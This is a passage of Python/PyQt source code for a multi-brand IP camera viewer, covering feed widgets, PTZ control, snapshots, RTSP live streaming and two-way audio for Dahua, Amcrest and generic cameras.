                    color: #ff6b6b;
                    border: 1px solid #ff6b6b;
                    border-radius: 3px;
                    padding: 2px 6px;
                    font-size: 9px;
                    font-weight: 600;
                }
            """)
            ctrl_layout.addWidget(rec_btn)

            # Per-channel Talk (mic) / Listen (sound) controls - apply only to
            # this channel, since each channel can be a different camera.
            mic_btn = QPushButton("🎤")
            mic_btn.setCheckable(True)
            mic_btn.setMaximumHeight(22)
            mic_btn.setMaximumWidth(24)
            mic_btn.setToolTip("Talk: send your microphone to this camera's speaker")
            mic_btn.setStyleSheet("""
                QPushButton {
                    background: #2b3037;
                    color: #9aa4af;
                    border: 1px solid #424851;
                    border-radius: 3px;
                    padding: 2px;
                    font-size: 10px;
                }
                QPushButton:checked {
                    background: #1e3a2f;
                    color: #51cf66;
                    border: 1px solid #51cf66;
                }
            """)
            mic_btn.clicked.connect(lambda checked, w=frame: self.toggle_pss_channel_mic(w))
            ctrl_layout.addWidget(mic_btn)
            frame._mic_btn = mic_btn

            sound_btn = QPushButton("🔊")
            sound_btn.setCheckable(True)
            sound_btn.setChecked(True)
            sound_btn.setMaximumHeight(22)
            sound_btn.setMaximumWidth(24)
            sound_btn.setToolTip("Listen: hear this camera's microphone")
            sound_btn.setStyleSheet("""
                QPushButton {
                    background: #1e3a2f;
                    color: #51cf66;
                    border: 1px solid #51cf66;
                    border-radius: 3px;
                    padding: 2px;
                    font-size: 10px;
                }
                QPushButton:!checked {
                    background: #2b3037;
                    color: #9aa4af;
                    border: 1px solid #424851;
                }
            """)
            sound_btn.clicked.connect(lambda checked, w=frame: self.toggle_pss_channel_sound(w))
            ctrl_layout.addWidget(sound_btn)
            frame._sound_btn = sound_btn

            ctrl_layout.addStretch()
            
            # PTZ control bar (hidden by default, shown when PTZ enabled)
            ptz_bar = QWidget()
            pl = QHBoxLayout(ptz_bar)
            pl.setContentsMargins(4, 4, 4, 4)
            pl.setSpacing(2)
            
            ptz_buttons = [
                ("up", "up"),
                ("down", "down"),
                ("left", "left"),
                ("right", "right"),
                ("+", "zoom_in"),
                ("-", "zoom_out"),
            ]

            for label, cmd in ptz_buttons:
                b = QPushButton() if label in ("up", "down", "left", "right") else QPushButton(label)
                if label in ("up", "down", "left", "right"):
                    b.setIcon(self._arrow_icon(label))
                    b.setIconSize(QSize(9, 9))
                b.setMaximumHeight(18)
                b.setMaximumWidth(32)
                b.setStyleSheet("""
                    QPushButton {
                        background: #2b3a4a;
                        color: #7ecfe8;
                        border: 1px solid #446688;
                        border-radius: 2px;
                        padding: 1px;
                        font-size: 8px;
                        font-weight: 700;
                    }
                    QPushButton:hover { background: #3a4a5a; border-color: #5678a8; }
                    QPushButton:pressed { background: #1a4a6a; }
                """)
                b.clicked.connect(partial(self.handle_ptz_new, ip, port, user, pwd, idx, cmd))
                pl.addWidget(b)
            
            pl.addStretch()
            ptz_bar.setVisible(False)
            frame._ptz_bar = ptz_bar
            v.addWidget(ptz_bar)
            
            # Control buttons bar
            v.addWidget(ctrl_bar)

            return frame
        except Exception as e:
            self.log(f"make_feed_widget error: {e}", "error")
            return QLabel("Error creating feed widget")

    def open_pss_channel_fullscreen(self, feed_widget):
        """Temporarily move one PSS channel into a fullscreen dialog."""
        try:
            if getattr(feed_widget, '_fullscreen_dialog', None):
                feed_widget._fullscreen_dialog.activateWindow()
                return

            restore = None
            for index in range(self.pss_feed_grid.count()):
                if self.pss_feed_grid.itemAt(index).widget() is feed_widget:
                    row, column, row_span, column_span = self.pss_feed_grid.getItemPosition(index)
                    restore = (row, column, row_span, column_span)
                    break

            dialog = QDialog(self)
            dialog.setWindowTitle(
                f"Dahua Live View - {feed_widget._ip}:{feed_widget._port} "
                f"Channel {feed_widget._channel + 1}"
            )
            dialog.setStyleSheet("QDialog { background: #101214; }")
            dialog_layout = QVBoxLayout(dialog)
            dialog_layout.setContentsMargins(8, 8, 8, 8)
            close_row = QHBoxLayout()
            close_row.addStretch()
            close_btn = QPushButton("Close Fullscreen")
            close_btn.clicked.connect(dialog.close)
            close_row.addWidget(close_btn)
            dialog_layout.addLayout(close_row)

            if restore is not None:
                self.pss_feed_grid.removeWidget(feed_widget)
            feed_widget.setParent(dialog)
            dialog_layout.addWidget(feed_widget, 1)
            feed_widget._fullscreen_dialog = dialog

            def restore_feed():
                dialog_layout.removeWidget(feed_widget)
                feed_widget.setParent(self.pss_feed_container)
                if restore is not None:
                    self.pss_feed_grid.addWidget(feed_widget, *restore)
                feed_widget._fullscreen_dialog = None
                feed_widget.show()

            dialog.finished.connect(lambda result: restore_feed())
            dialog.showFullScreen()
            dialog.raise_()
            dialog.activateWindow()
            self.log(
                f"Opened fullscreen PSS channel {feed_widget._channel + 1} "
                f"for {feed_widget._ip}:{feed_widget._port}",
                "info",
            )
        except Exception as exc:
            self.log(f"PSS channel fullscreen error: {exc}", "error")

    def handle_ptz_new(self, ip, port, user, pwd, channel, command):
        """Send PTZ command to device (Dahua, Amcrest, or generic).
        Routes to brand-specific handlers via PSS_Manager."""
        try:
            device_key = f"{ip}:{port}"

            # Determine brand
            brand = "Dahua"
            session_token = None
            if hasattr(self, '_pss_sessions'):
                session_data = self._pss_sessions.get(device_key, {})
                brand = session_data.get('brand', 'Dahua')
                session_token = session_data.get('session_token')

            # DAHUA-SPECIFIC (preserves existing Dahua helper workflow)
            if brand.lower() == "dahua":
                try:
                    from modules.dahua_pss_helper import send_ptz_command, load_dahua_controller
                    controller = None
                    if hasattr(self, '_pss_device_controllers'):
                        ctrl_info = self._pss_device_controllers.get(device_key)
                        if ctrl_info:
                            controller = ctrl_info.get('controller')
                    if not controller:
                        controller = load_dahua_controller(ip, port, user, pwd)
                    if controller and hasattr(controller, 'status') and controller.status.name == 'SUCCESS':
                        result = send_ptz_command(controller, channel, command)
                        if result:
                            self.log(f"PTZ {command} sent to {ip}:{port} channel {channel}", "success")
                        else:
                            self.log(f"PTZ {command} failed for {ip}:{port}", "warning")
                    else:
                        self.log(f"Device {ip}:{port} not connected for PTZ", "error")
                except Exception as e:
                    self.log(f"Dahua PTZ error: {e}", "warning")

            # OTHER BRANDS (Amcrest, Generic) via PSS_Manager
            else:
                try:
                    from modules.pss_manager import pss_manager, PSS_Session
                    session = PSS_Session(
                        brand=brand,
                        ip=ip,
                        port=port,
                        username=user,
                        password=pwd,
                        session_token=session_token
                    )
                    # Map command names to PTZ directions
                    direction_map = {
                        "up": "up", "down": "down", "left": "left", "right": "right",
                        "upleft": "up-left", "upright": "up-right",
                        "downleft": "down-left", "downright": "down-right",
                        "zoomin": "zoom-in", "zoomout": "zoom-out",
                    }
                    direction = direction_map.get(command.lower(), command.lower())
                    result = pss_manager.handle_ptz_start(session, channel, direction, speed=50)
                    if result:
                        self.log(f"PTZ {command} started on {ip}:{port} channel {channel} ({brand})", "success")
                        # Schedule stop after a short delay
                        QTimer.singleShot(500, lambda: pss_manager.handle_ptz_stop(session, channel))
                    else:
                        self.log(f"PTZ {command} not supported or failed for {ip}:{port} ({brand})", "warning")
                except Exception as e:
                    self.log(f"{brand} PTZ error: {e}", "warning")
        except Exception as e:
            self.log(f"PTZ handler error: {e}", "error")

    def fetch_pss_snapshot(self, ip, port, user, pwd, channel, log=True):
        """Fetch snapshot from camera (Dahua, Amcrest, or generic) and display in feed widget.

        Routes to brand-specific snapshot methods via PSS_Manager when available.
        """
        try:
            device_key = f"{ip}:{port}"
            if log:
                self.log(f"Fetching snapshot from {ip}:{port} channel {channel}...", "info")

            img_bytes = None

            # Determine brand and fetch accordingly
            brand = "Dahua"
            session_token = None
            if hasattr(self, '_pss_sessions'):
                session_data = self._pss_sessions.get(device_key, {})
                brand = session_data.get('brand', 'Dahua')
                session_token = session_data.get('session_token')

            # DAHUA-SPECIFIC (preserves existing Smart PSS XML workflow)
            if brand.lower() == "dahua":
                try:
                    from modules.dahua_pss_helper import load_dahua_controller, get_snapshot
                    controller = None
                    if hasattr(self, '_pss_device_controllers'):
                        ctrl_info = self._pss_device_controllers.get(device_key)
                        if ctrl_info:
                            controller = ctrl_info.get('controller')
                    if not controller:
                        controller = load_dahua_controller(ip, port, user, pwd)
                        if not hasattr(self, '_pss_device_controllers'):
                            self._pss_device_controllers = {}
                        self._pss_device_controllers[device_key] = {'controller': controller}
                    if controller and hasattr(controller, 'status') and controller.status.name == 'SUCCESS':
                        img_bytes = get_snapshot(controller, channel)
                except Exception as e:
                    self.log(f"Dahua snapshot error: {e}", "warning")

            # OTHER BRANDS (Amcrest, Generic, etc.) via PSS_Manager
            else:
                try:
                    from modules.pss_manager import pss_manager, PSS_Session
                    session = PSS_Session(
                        brand=brand,
                        ip=ip,
                        port=port,
                        username=user,
                        password=pwd,
                        session_token=session_token
                    )
                    img_bytes = pss_manager.handle_snapshot(session, channel)
                except Exception as e:
                    self.log(f"{brand} snapshot error: {e}", "warning")

            # Display the snapshot if we got it
            if img_bytes:
                for i in range(self.pss_feed_grid.count()):
                    item = self.pss_feed_grid.itemAt(i)
                    if item:
                        w = item.widget()
                        if hasattr(w, '_ip') and hasattr(w, '_port') and hasattr(w, '_channel'):
                            if w._ip == ip and w._port == port and w._channel == channel:
                                pix = QPixmap()
                                if pix.loadFromData(img_bytes):
                                    scaled = pix.scaledToWidth(240, Qt.TransformationMode.SmoothTransformation)
                                    lbl = w._feed_label
                                    lbl.setPixmap(scaled)
                                    lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
                                    w._state_label.setText("● LIVE")
                                    w._state_label.setStyleSheet("color: #7ee787; font-size: 10px; font-weight: 700;")
                                    if log:
                                        self.log(f"Snapshot displayed for {ip}:{port} channel {channel}", "success")
                                return
                self.log(f"Snapshot fetched but widget not found", "warning")
            else:
                self.log(f"No snapshot data from {ip}:{port}", "warning")
        except Exception as e:
            self.log(f"Snapshot error: {e}", "error")

    def build_dahua_rtsp_url(self, ip, port, user, pwd, channel, subtype=0, rtsp_port=None):
        try:
            auth = f"{user}:{pwd}@" if user and pwd else ""
            # Keep port as-is for Dahua (37777 for RTSP on Dahua)
            if rtsp_port is None:
                rtsp_port = 554 if int(port) == 37777 else port
            channel_id = max(1, int(channel) + 1)
            return f"rtsp://{auth}{ip}:{rtsp_port}/cam/realmonitor?channel={channel_id}&subtype={subtype}"
        except Exception:
            return f"rtsp://{ip}:37777/cam/realmonitor?channel={max(1, int(channel) + 1)}&subtype=0"

    def start_pss_live_stream(self, w, rtsp_port=None):
        try:
            if not getattr(w, '_video_widget', None) or not getattr(w, '_feed_stack', None):
                return False
            if getattr(w, '_media_player', None):
                return True

            # Determine brand and build appropriate RTSP URL
            device_key = f"{w._ip}:{w._port}"
            brand = "Dahua"
            if hasattr(self, '_pss_sessions'):
                session_data = self._pss_sessions.get(device_key, {})
                brand = session_data.get('brand', 'Dahua')

            if rtsp_port is None:
                rtsp_port = getattr(w, '_rtsp_port', None) or (554 if int(w._port) == 37777 else w._port)

            # Build RTSP URL based on brand
            if brand.lower() == "dahua":
                rtsp_url = self.build_dahua_rtsp_url(w._ip, w._port, w._user, w._pwd, w._channel, rtsp_port=rtsp_port)
            elif brand.lower() == "amcrest":
                # Amcrest uses similar RTSP endpoint with standard port 554
                auth = f"{w._user}:{w._pwd}@" if w._user and w._pwd else ""
                channel_id = int(w._channel)  # Amcrest uses 0-indexed channels
                rtsp_url = f"rtsp://{auth}{w._ip}:{rtsp_port}/cam/realmonitor?channel={channel_id}&subtype=0&unicast=true&proto=Onvif"
            else:
                # Generic fallback
                auth = f"{w._user}:{w._pwd}@" if w._user and w._pwd else ""
                rtsp_url = f"rtsp://{auth}{w._ip}:{rtsp_port}/cam/realmonitor?channel={int(w._channel)}&subtype=0"

            sanitized_url = rtsp_url
            if w._user and w._pwd:
                sanitized_url = rtsp_url.replace(f"{w._user}:{w._pwd}@", "")
            if getattr(self, 'debug_check', None) and self.debug_check.isChecked():
                self.log(f"RTSP URL ({brand}): {sanitized_url}", "debug")

            player = QMediaPlayer(self)
            audio_output = QAudioOutput(self)
            player.setAudioOutput(audio_output)
            player.setVideoOutput(w._video_widget)
            player.setSource(QUrl(rtsp_url))
            player.mediaStatusChanged.connect(lambda status, w=w: self.on_pss_media_status(w, status))
            player.errorOccurred.connect(lambda error, message, w=w: self.on_pss_stream_error(w, error, message))
            player.play()

            w._media_player = player
            w._audio_output = audio_output
            w._streaming = False
            w._feed_stack.setCurrentWidget(w._video_widget)
            w._state_label.setText("● LIVE")
            w._state_label.setStyleSheet("color: #7ee787; font-size: 10px; font-weight: 700;")
            w._state_label.setText("CONNECTING")
            w._state_label.setStyleSheet("color: #d7c27a; font-size: 10px; font-weight: 700;")
            self.log(f"Starting RTSP stream for {w._ip}:{w._port} channel {w._channel}", "info")
            return True
        except Exception as e:
            self.log(f"RTSP stream failed for {w._ip}:{w._port} channel {w._channel}: {e}", "warning")
            if not getattr(w, '_rtsp_fallback_tried', False) and getattr(w, '_rtsp_fallback_port', None):
                w._rtsp_fallback_tried = True
                self.log(f"Retrying RTSP on fallback port {w._rtsp_fallback_port} for {w._ip}:{w._port} channel {w._channel}", "info")
                return self.start_pss_live_stream(w, rtsp_port=w._rtsp_fallback_port)
            w._streaming = False
            return False

    def on_pss_media_status(self, w, status):
        try:
            if status in (QMediaPlayer.MediaStatus.LoadedMedia, QMediaPlayer.MediaStatus.BufferedMedia):
                w._streaming = True
                w._state_label.setText("LIVE")
                w._state_label.setStyleSheet("color: #7ee787; font-size: 10px; font-weight: 700;")
                self.log(f"RTSP live stream buffered for {w._ip}:{w._port} channel {w._channel}", "success")
                return
            if status in (QMediaPlayer.MediaStatus.InvalidMedia, QMediaPlayer.MediaStatus.NoMedia):
                self.log(f"RTSP stream invalid for {w._ip}:{w._port} channel {w._channel}", "warning")
                self.stop_pss_live_stream(w)
            elif status == QMediaPlayer.MediaStatus.EndOfMedia:
                self.log(f"RTSP stream ended for {w._ip}:{w._port} channel {w._channel}", "info")
                self.stop_pss_live_stream(w)
        except Exception as e:
            self.log(f"PSS media status handler error: {e}", "warning")

    def on_pss_stream_error(self, w, error, message=''):
        try:
            if error != QMediaPlayer.Error.NoError:
                if not message and getattr(w, '_media_player', None):
                    message = getattr(w._media_player, 'errorString', lambda: 'Unknown error')()
                self.log(f"RTSP stream error for {w._ip}:{w._port} channel {w._channel}: {message}", "warning")
                if not getattr(w, '_rtsp_fallback_tried', False) and getattr(w, '_rtsp_fallback_port', None):
                    w._rtsp_fallback_tried = True
                    self.stop_pss_live_stream(w)
                    self.log(f"Falling back to RTSP port {w._rtsp_fallback_port} for {w._ip}:{w._port} channel {w._channel}", "info")
                    self.start_pss_live_stream(w, rtsp_port=w._rtsp_fallback_port)
                    return
                self.stop_pss_live_stream(w)
            return
        except Exception as e:
            self.log(f"PSS stream error handler failed: {e}", "warning")

    def _update_pss_feed_state(self, w, is_live):
        try:
            if is_live:
                w._state_label.setText("● LIVE")
                w._state_label.setStyleSheet("color: #7ee787; font-size: 10px; font-weight: 700;")
            else:
                w._state_label.setText("● STANDBY")
                w._state_label.setStyleSheet("color: #9aa4af; font-size: 10px; font-weight: 600;")
        except Exception as e:
            self.log(f"State update error: {e}", "warning")

    def stop_pss_live_stream(self, w):
        try:
            w._streaming = False
            if getattr(w, '_media_player', None):
                try:
                    w._media_player.stop()
                except Exception:
                    pass
                try:
                    w._media_player.deleteLater()
                except Exception:
                    pass
                w._media_player = None
            if getattr(w, '_audio_output', None):
                try:
                    w._audio_output.deleteLater()
                except Exception:
                    pass
                w._audio_output = None
            self._restore_pss_feed_label(w)
        except Exception as e:
            self.log(f"Stop stream error: {e}", "warning")

    def handle_ptz(self, data):
        try:
            ip, idx, cmd = data
            self.log(f"PTZ {cmd} for {ip} cam {idx+1}", "info")
            QMessageBox.information(self, "PTZ", f"PTZ {cmd} for {ip} cam {idx+1}")
        except Exception as e:
            self.log(f"PTZ handler error: {e}", "error")

    def toggle_ptz_mode(self, enabled):
        try:
            # Iterate through all feed widgets
            for i in range(self.pss_feed_grid.count()):
                it = self.pss_feed_grid.itemAt(i)
                if not it:
                    continue
                w = it.widget()
                if hasattr(w, '_ptz_bar'):
                    w._ptz_bar.setVisible(enabled)
            self.log(f"PTZ mode {'enabled' if enabled else 'disabled'}.", "info")
        except Exception as e:
            self.log(f"toggle_ptz_mode error: {e}", "error")

    def toggle_live_mode(self, enabled):
        try:
            for i in range(self.pss_feed_grid.count()):
                it = self.pss_feed_grid.itemAt(i)
                if not it:
                    continue
                w = it.widget()
                if not w:
                    continue

                if enabled:
                    if not self.start_pss_live_stream(w):
                        self._restore_pss_feed_label(w)
                else:
                    self.stop_pss_live_stream(w)

            self.log(f"Live mode {'on' if enabled else 'off'}.", "info")
        except Exception as e:
            self.log(f"toggle_live_mode error: {e}", "error")

    def toggle_pss_channel_sound(self, widget):
        """Listen: mute/unmute this channel's received RTSP audio (per-channel, not global)."""
        try:
            enabled = widget._sound_btn.isChecked() if getattr(widget, '_sound_btn', None) else True
            if getattr(widget, '_audio_output', None):
                widget._audio_output.setMuted(not enabled)
            self.log(
                f"PSS listen {'enabled' if enabled else 'muted'} for {widget._ip} channel {widget._channel + 1}",
                "info",
            )
        except Exception as exc:
            self.log(f"PSS sound toggle error: {exc}", "error")

    def toggle_pss_channel_mic(self, widget):
        """Talk: start/stop sending this PC's microphone to the channel's camera speaker."""
        try:
            enabled = widget._mic_btn.isChecked() if getattr(widget, '_mic_btn', None) else False
            if enabled:
                self._start_pss_talk(widget)
            else:
                self._stop_pss_talk(widget)
        except Exception as exc:
            self.log(f"PSS mic toggle error: {exc}", "error")

    def _start_pss_talk(self, widget):
        try:
            if getattr(widget, '_talk_session', None) and widget._talk_session.is_active():
                return

            # Determine brand
            device_key = f"{widget._ip}:{widget._port}"
            brand = "Dahua"
            session_token = None
            if hasattr(self, '_pss_sessions'):
                session_data = self._pss_sessions.get(device_key, {})
                brand = session_data.get('brand', 'Dahua')
                session_token = session_data.get('session_token')

            # Create appropriate talk session based on brand
            if brand.lower() == "dahua":
                talk = DahuaAudioTalk(widget._ip, widget._user, widget._pwd,
                                     channel=widget._channel, http_port=80, log=self.log)
            elif brand.lower() == "amcrest":
                from modules.amcrest_audio import AmcrestAudioTalk
                talk = AmcrestAudioTalk(widget._ip, widget._port, widget._user, widget._pwd,
                                       channel=widget._channel, session_token=session_token,
                                       http_port=widget._port, log=self.log)
            else:
                # Generic fallback (try Amcrest-style endpoint)
                from modules.amcrest_audio import AmcrestAudioTalk
                talk = AmcrestAudioTalk(widget._ip, widget._port, widget._user, widget._pwd,
                                       channel=widget._channel, http_port=widget._port, log=self.log)

            talk.start()
            widget._talk_session = talk

            # Setup audio capture
            audio_format = QAudioFormat()
            audio_format.setSampleRate(8000)
            audio_format.setChannelCount(1)
            audio_format.setSampleFormat(QAudioFormat.SampleFormat.Int16)

            device = QMediaDevices.defaultAudioInput()
            source = QAudioSource(device, audio_format, self)
            io_device = source.start()
            io_device.readyRead.connect(lambda w=widget, io=io_device: self._on_pss_mic_data(w, io))

            widget._audio_source = source
            widget._audio_source_io = io_device
            self.log(f"PSS talk started for {widget._ip} channel {widget._channel + 1} ({brand})", "success")
        except Exception as exc:
            self.log(f"PSS talk start error: {exc}", "error")
            if getattr(widget, '_mic_btn', None):
                widget._mic_btn.setChecked(False)
            self._stop_pss_talk(widget)

    def _on_pss_mic_data(self, widget, io_device):
        try:
            data = io_device.readAll()
            if data and getattr(widget, '_talk_session', None):
                widget._talk_session.send_chunk(bytes(data))
        except Exception as exc:
            self.log(f"PSS mic capture error: {exc}", "warning")

    def _stop_pss_talk(self, widget):
        try:
            if getattr(widget, '_audio_source', None):
                try:
                    widget._audio_source.stop()
                except Exception:
                    pass
                widget._audio_source = None
                widget._audio_source_io = None
            if getattr(widget, '_talk_session', None):
                widget._talk_session.stop()
                widget._talk_session = None
                self.log(f"PSS talk stopped for {widget._ip} channel {widget._channel + 1}", "info")
        except Exception as exc:
            self.log(f"PSS talk stop error: {exc}", "error")

    def _restore_pss_feed_label(self, w):
        try:
            if getattr(w, '_feed_stack', None) and getattr(w, '_feed_label', None):
                w._feed_stack.setCurrentWidget(w._feed_label)
            if getattr(w, '_feed_label', None) and not w._feed_label.pixmap():
                w._feed_label.setText(getattr(w, '_base_text', 'Waiting for live feed...'))
            if getattr(w, '_state_label', None):
                w._state_label.setText("● STANDBY")
                w._state_label.setStyleSheet("color: #9aa4af; font-size: 10px; font-weight: 600;")
        except Exception as e:
            self.log(f"restore PSS feed label error: {e}", "error")

    def _refresh_pss_live_feeds(self):
        try:
            for i in range(self.pss_feed_grid.count()):
                item = self.pss_feed_grid.itemAt(i)
                if not item:
                    continue
                w = item.widget()
                if not w or not hasattr(w, '_ip'):
                    continue
                if getattr(w, '_streaming', False):
                    continue
                self.fetch_pss_snapshot(w._ip, w._port, w._user, w._pwd, w._channel, log=False)
        except Exception as e:
            self.log(f"PSS live refresh error: {e}", "error")

    def select_pss_channel(self, index):
        """Show and stream only the channel selected via the Prev/Next controls."""
        try:
            widgets = getattr(self, '_pss_feed_widgets', [])
            if not widgets or index < 0 or index >= len(widgets):
                return
            selected = widgets[index]
            for widget in widgets:
                if widget is selected:
                    continue
                if getattr(widget, '_streaming', False) or getattr(widget, '_media_player', None):
                    self.stop_pss_live_stream(widget)
                if getattr(widget, '_talk_session', None):
                    # can't talk to a camera you've switched away from
                    if getattr(widget, '_mic_btn', None):
                        widget._mic_btn.setChecked(False)
                    self._stop_pss_talk(widget)
                widget.hide()

            while self.pss_feed_grid.count():
                item = self.pss_feed_grid.takeAt(0)
                old_widget = item.widget()
                if old_widget and old_widget is not selected:
                    old_widget.hide()

            selected.setParent(self.pss_feed_container)
            self.pss_feed_grid.addWidget(selected, 0, 0)
            self.pss_feed_grid.setRowStretch(0, 1)
            selected.show()
            self._pss_current_channel_index = index
            self._update_pss_channel_label(index, len(widgets))
            if self.pss_live_checkbox.isChecked():
                self.start_pss_live_stream(selected)
            self.log(f"PSS channel selected: {selected._channel + 1}", "info")
        except Exception as exc:
            self.log(f"PSS channel selection error: {exc}", "error")

    def select_pss_previous_channel(self):
        """Step the single-display view to the previous channel."""
        try:
            widgets = getattr(self, '_pss_feed_widgets', [])
            if not widgets:
                return
            idx = getattr(self, '_pss_current_channel_index', 0)
            if idx > 0:
                self.select_pss_channel(idx - 1)
        except Exception as exc:
            self.log(f"PSS previous channel error: {exc}", "warning")

    def select_pss_next_channel(self):
        """Step the single-display view to the next channel."""
        try:
            widgets = getattr(self, '_pss_feed_widgets', [])
            if not widgets:
                return
            idx = getattr(self, '_pss_current_channel_index', 0)
            if idx < len(widgets) - 1:
                self.select_pss_channel(idx + 1)
        except Exception as exc:
            self.log(f"PSS next channel error: {exc}", "warning")

    def _update_pss_channel_label(self, index, total):
        """Show 'Channel N / Total' next to the Prev/Next buttons."""
        try:
            if not getattr(self, 'pss_channel_label', None):
                return
            if total <= 0 or index < 0:
                self.pss_channel_label.setText("No channels")
                return
            self.pss_channel_label.setText(f"Channel {index + 1} / {total}")
        except Exception as exc:
            self.log(f"PSS channel label update error: {exc}", "warning")

    def _set_pss_channel_controls_visible(self, visible):
        """Show/hide the Prev/Next channel controls together (mirrors pss_url_bar visibility)."""
        try:
            for w in (
                getattr(self, 'pss_channel_prev_btn', None),
                getattr(self, 'pss_channel_label', None),
                getattr(self, 'pss_channel_next_btn', None),
            ):
                if w is not None:
                    w.setVisible(visible)
        except Exception:
            pass

    def populate_pss_feeds(self, data):
        """Populate camera feed placeholders for a device with real data.

        Supports multiple camera brands via the PSS_Manager. For Dahua, uses
        the existing Smart PSS helper logic. For Amcrest/Generic, routes through
        the PSS_Manager handlers. Preserves backward compatibility with legacy
        (ip, count) format and imported XML devices.
        """
        try:
            # Clear existing widgets
            while self.pss_feed_grid.count():
                w = self.pss_feed_grid.takeAt(0).widget()
                if w:
                    if getattr(w, '_media_player', None):
                        self.stop_pss_live_stream(w)
                    w.setParent(None)
            self._pss_feed_widgets = []

            if not data:
                if getattr(self, 'pss_active_device_label', None):
                    self.pss_active_device_label.setText("Import XML or add a device from results")
                empty = QFrame()
                empty.setStyleSheet("""
                    QFrame {
                        background: #1c1f24;
                        border: 2px dashed #454b54;
                        border-radius: 6px;
                    }
                    QLabel { color: #9aa4af; border: none; font-size: 12px; }
                """)
                empty_layout = QVBoxLayout(empty)
                empty_layout.setContentsMargins(16, 16, 16, 16)
                label = QLabel("📹 No device selected\n\nLive camera feeds will appear here\n\nImport XML or select a device to begin")
                label.setAlignment(Qt.AlignmentFlag.AlignCenter)
                label.setMinimumHeight(260)
                empty_layout.addWidget(label)
                self.pss_feed_grid.addWidget(empty, 0, 0)
                self._pss_current_channel_index = -1
                if getattr(self, 'pss_channel_label', None):
                    self.pss_channel_label.setText("No channels")
                return

            # Unpack device data (supports multiple formats)
            brand = "Dahua"
            session_token = None
            if len(data) >= 6:
                # New format: (ip, port, brand, user, pwd, count) or with session_token
                ip, port, brand, user, pwd, count = data[0], data[1], data[2], data[3], data[4], data[5]
                if len(data) >= 7:
                    session_token = data[6]
            elif len(data) >= 5:
                # Imported XML format: (ip, port, user, pwd, count)
                ip, port, user, pwd, count = data[0], data[1], data[2], data[3], data[4]
            else:
                # Legacy format: (ip, count)
                ip, count = data
                port = 37777
                user = pwd = ""

            count = max(1, int(count))

            # Update header
            if getattr(self, 'pss_active_device_label', None):
                self.pss_active_device_label.setText(f"🔴 {ip}:{port} ({brand}) - {count} channel(s)")

            # Store PSS session metadata for later use (snapshots, streams, etc.)
            if not hasattr(self, '_pss_sessions'):
                self._pss_sessions = {}
            self._pss_sessions[f"{ip}:{port}"] = {
                'brand': brand,
                'ip': ip,
                'port': port,
                'username': user,
                'password': pwd,
                'session_token': session_token,
            }

            # DAHUA-SPECIFIC BRANCH (preserves existing Smart PSS XML workflow)
            if brand.lower() == "dahua":
                try:
                    from modules.dahua_pss_helper import load_dahua_controller, get_device_capabilities, get_device_channels
                    cached = getattr(self, '_pss_device_controllers', {}).get(f"{ip}:{port}", {})
                    controller = cached.get('controller') if isinstance(cached, dict) else None
                    if controller:
                        # Get real channel count from device
                        real_count = get_device_channels(controller)
                        capabilities = get_device_capabilities(controller)

                        # Store controller for later use
                        if not hasattr(self, '_pss_device_controllers'):
                            self._pss_device_controllers = {}
                        caps = []
                        if capabilities.get('ptz'): caps.append('PTZ')
                        if capabilities.get('mic'): caps.append('MIC')
                        if capabilities.get('sound'): caps.append('SND')
                        caps_label = f" [{' / '.join(caps)}]" if caps else ''
                        self._pss_device_controllers[f"{ip}:{port}"] = {
                            'controller': controller,
                            'capabilities': capabilities,
                            'user': user,
                            'pwd': pwd,
                            'count': count,
                        }

                        count = real_count
                        if getattr(self, 'pss_active_device_label', None):
                            status_icon = "🟢" if controller.status.name == 'SUCCESS' else "🟡"
                            self.pss_active_device_label.setText(
                                f"{status_icon} {ip}:{port} - {capabilities.get('model', 'Unknown')} ({count}ch){caps_label}"
                            )
                        self.log(f"Connected to {ip}:{port} - {capabilities.get('model')} ({count} channels){caps_label}", "success")

                        self._pss_device_controllers[f"{ip}:{port}"]['capabilities'] = capabilities
                except Exception as e:
                    self.log(f"Warning: Could not connect to device {ip}:{port} via Dahua helper - {e}", "warning")

            # OTHER BRANDS (Amcrest, Generic, etc.) use PSS_Manager
            elif brand.lower() in ("amcrest", "generic"):
                try:
                    from modules.pss_manager import pss_manager, PSS_Session
                    session = PSS_Session(
                        brand=brand,
                        ip=ip,
                        port=port,
                        username=user,
                        password=pwd,
                        session_token=session_token
                    )
                    dev_info = pss_manager.handle_device_info(session)
                    if dev_info:
                        model = dev_info.get('model', 'Unknown')
                        self.log(f"Connected to {ip}:{port} ({brand}) - {model}", "success")
                        if getattr(self, 'pss_active_device_label', None):
                            self.pss_active_device_label.setText(
                                f"🟢 {ip}:{port} ({brand}) - {model} ({count}ch)"
                            )
                except Exception as e:
                    self.log(f"Warning: Could not query device {ip}:{port} ({brand}) - {e}", "warning")

            # Create grid layout: 2-3 columns depending on count
            cols = 3 if count > 4 else 2

            for i in range(count):
                fw = self._make_feed_widget(ip, int(port), user, pwd, i, count)
                fw.hide()
                self._pss_feed_widgets.append(fw)

            self.select_pss_channel(0)

            # Apply current PTZ and Live mode states
            self.toggle_ptz_mode(self.pss_ptz_checkbox.isChecked())

            # Populate URL bar with RTSP template for this device
            try:
                from modules.pss_manager import pss_manager
                template = pss_manager.get_rtsp_template(brand)
                if getattr(self, 'pss_url_bar', None):
                    self.pss_url_bar.setText(template)
                    self.pss_url_bar.setToolTip(f"RTSP template for {brand} - edit as needed, press Enter to load")
            except Exception as e:
                self.log(f"Warning: Could not populate RTSP template: {e}", "warning")

            self.log(f"PSS: Showing channel selector with {count} channels for {ip}:{port} ({brand})", "info")
        except Exception as e:
            self.log(f"populate_pss_feeds error: {e}", "error")

    def setup_browser(self):
        # If we have a stacked browser (IE / WebEngine / PSS), initialize underlying browsers
        # but prefer showing PSS when PSS Mode is active. Do NOT early-return before
        # initializing IE/WebEngine so switching to IE still properly sets up IE.
        if getattr(self, 'browser_stack', None):
            # initialize the requested browser backend so it's ready when switched
            if self.use_ie:
                try:
                    self.setup_ie()
                except Exception as e:
                    self.log(f"IE setup failed in setup_browser: {e}", "warning")
                    self.use_ie = False
            else:
                try:
                    self.setup_webengine()
                except Exception as e:
                    self.log(f"WebEngine setup failed in setup_browser: {e}", "warning")

            # Now decide which view to present
            try:
                if getattr(self, 'pss_mode_action', None) and self.pss_mode_action.isChecked() and getattr(self, 'pss_widget', None):
                    self.browser_stack.setCurrentWidget(self.pss_widget)
                else:
                    if self.use_ie:
                        self.browser_stack.setCurrentIndex(0)
                    else:
                        self.browser_stack.setCurrentIndex(1)
            except Exception:
                pass
            QTimer.singleShot(60, self.resize_browser_container)
            return

        # fallback (older behavior)
